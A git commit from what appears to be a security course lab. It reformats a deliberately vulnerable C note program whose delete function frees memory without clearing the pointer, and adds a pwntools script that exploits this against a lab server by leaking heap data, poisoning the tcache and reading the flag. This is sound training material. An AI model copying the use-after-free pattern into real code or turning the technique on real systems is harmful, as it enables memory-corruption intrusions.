997916d24a0a2b3c2d0948a72c4ee8c4ad1e1dd2
LolaInTa Chi <lolainta@gmail.com>
2023-12-14 16:35:30 +0800

    feat: lab9 done

--- lab9/double_free/chal.c
+++ lab9/double_free/chal.c
@@ -1,118 +1,105 @@
+#include <fcntl.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
 #include <sys/types.h>
-#include <fcntl.h>
+#include <unistd.h>
 
-struct note
-{
-	char *content;
-	unsigned long len;
+struct note {
+  char *content;
+  unsigned long len;
 };
 
 struct note notes[0x10];
 
-int read_int()
-{
-	char buf[0x20];
-	read(0, buf, 0x1f);
-	return atoi(buf);
+int read_int() {
+  char buf[0x20];
+  read(0, buf, 0x1f);
+  return atoi(buf);
 }
 
-unsigned long read_ul()
-{
-	char buf[0x20];
-	read(0, buf, 0x1f);
-	return strtoul(buf, NULL, 10);
+unsigned long read_ul() {
+  char buf[0x20];
+  read(0, buf, 0x1f);
+  return strtoul(buf, NULL, 10);
 }
 
-int get_idx()
-{
-	int idx = read_int();
-	if (idx >= 0x10 || idx < 1)
-		exit(0);
-	return idx;
+int get_idx() {
+  int idx = read_int();
+  if (idx >= 0x10 || idx < 1) exit(0);
+  return idx;
 }
 
-void add_note()
-{
-	int idx;
-	printf("Index: ");
-	idx = get_idx();
-	printf("Length: ");
-	notes[idx].len = read_ul();
-	notes[idx].content = malloc(notes[idx].len);
-	puts("Add done");
+void add_note() {
+  int idx;
+  printf("Index: ");
+  idx = get_idx();
+  printf("Length: ");
+  notes[idx].len = read_ul();
+  notes[idx].content = malloc(notes[idx].len);
+  puts("Add done");
 }
 
-void read_note()
-{
-	int idx;
-	printf("Index: ");
-	idx = get_idx();
-	printf("Note[%d]:\n", idx);
-	write(1, notes[idx].content, notes[idx].len);
+void read_note() {
+  int idx;
+  printf("Index: ");
+  idx = get_idx();
+  printf("Note[%d]:\n", idx);
+  write(1, notes[idx].content, notes[idx].len);
 }
 
-void write_note()
-{
-	int idx;
-	printf("Index: ");
-	idx = get_idx();
-	printf("Content: ");
-	read(0, notes[idx].content, notes[idx].len);
+void write_note() {
+  int idx;
+  printf("Index: ");
+  idx = get_idx();
+  printf("Content: ");
+  read(0, notes[idx].content, notes[idx].len);
 }
 
-void delete_note()
-{
-	int idx;
-	printf("Index: ");
-	idx = get_idx();
-	free(notes[idx].content);
-	puts("Delete done");
+void delete_note() {
+  int idx;
+  printf("Index: ");
+  idx = get_idx();
+  free(notes[idx].content);
+  puts("Delete done");
 }
 
-void memu()
-{
-	puts("1. add note");
-	puts("2. read note");
-	puts("3. write note");
-	puts("4. delete note");
-	printf("choice: ");
+void memu() {
+  puts("1. add note");
+  puts("2. read note");
+  puts("3. write note");
+  puts("4. delete note");
+  printf("choice: ");
 }
 
-int main(void)
-{
-	setvbuf(stdin, 0, 2, 0);
-	setvbuf(stdout, 0, 2, 0);
-	int fd = open("./flag.txt", O_RDONLY);
-	notes[0].len = 0x30;
-	notes[0].content = malloc(0x30);
-	read(fd, notes[0].content, 0x30);
-	close(fd);
+int main(void) {
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+  int fd = open("./flag.txt", O_RDONLY);
+  notes[0].len = 0x30;
+  notes[0].content = malloc(0x30);
+  read(fd, notes[0].content, 0x30);
+  close(fd);
 
-	for (;;)
-	{
-		memu();
-		int choice = read_int();
-		switch (choice)
-		{
-		case 1:
-			add_note();
-			break;
-		case 2:
-			read_note();
-			break;
-		case 3:
-			write_note();
-			break;
-		case 4:
-			delete_note();
-			break;
-		default:
-			puts("Invalid command");
-		}
-	}
-	return 0;
+  for (;;) {
+    memu();
+    int choice = read_int();
+    switch (choice) {
+      case 1:
+        add_note();
+        break;
+      case 2:
+        read_note();
+        break;
+      case 3:
+        write_note();
+        break;
+      case 4:
+        delete_note();
+        break;
+      default:
+        puts("Invalid command");
+    }
+  }
+  return 0;
 }
---
+++ lab9/double_free/sol.py
@@ -0,0 +1,87 @@
+from pwn import *
+
+context.arch = "amd64"
+context.terminal = ["tmux", "splitw", "-h"]
+
+
+def add_note(r, idx: int, length: int):
+    r.recvuntil(b"choice: ")
+    r.sendline(b"1")
+    r.recvuntil(b"Index: ")
+    r.sendline(str(idx).encode())
+    r.recvuntil(b"Length: ")
+    r.sendline(str(length).encode())
+    ret = r.recvline()
+    assert ret == b"Add done\n"
+
+
+def read_note(r, idx: int):
+    r.recvuntil(b"choice: ")
+    r.sendline(b"2")
+    r.recvuntil(b"Index: ")
+    r.sendline(str(idx).encode())
+    r.recvline()
+    return r.recvline()
+
+
+def write_note(r, idx: int, note: bytes):
+    r.recvuntil(b"choice: ")
+    r.sendline(b"3")
+    r.recvuntil(b"Index: ")
+    r.sendline(str(idx).encode())
+    r.recvuntil(b"Content: ")
+    r.send(note)
+
+
+def delete_note(r, idx: int):
+    r.recvuntil(b"choice: ")
+    r.sendline(b"4")
+    r.recvuntil(b"Index: ")
+    r.sendline(str(idx).encode())
+    ret = r.recvline()
+    assert ret == b"Delete done\n"
+
+
+def sol(off):
+    r = remote("10.113.184.121", 10058)
+
+    # r = process("./chal")
+    # attach(
+    #     r,
+    #     """
+    #     b main
+    #     continue
+    #     """,
+    # )
+    log.debug("Add note 1")
+    add_note(r, 1, 0x30)
+    log.debug("Add note 2")
+    add_note(r, 2, 0x30)
+    log.debug("Delete note 1")
+    delete_note(r, 1)
+    log.debug("Delete note 2")
+    delete_note(r, 2)
+    log.debug("Read note 2")
+    ret = read_note(r, 2)
+    heap_addr = u64(ret[:8])
+    log.info("Heap addr: %#x", heap_addr)
+    key = u64(ret[8:16])
+    log.info("Key: %#x", key)
+    write_note(r, 2, p64(heap_addr - off) + p64(0))
+    add_note(r, 3, 0x30)
+    add_note(r, 4, 0x30)
+    flag = read_note(r, 4)
+    r.close()
+    return flag[:8]
+
+
+def main():
+    flag = b""
+    flag += sol(0x40)
+    flag += sol(0x38)
+    flag += sol(0x30)
+    print(flag)
+
+
+if __name__ == "__main__":
+    main()
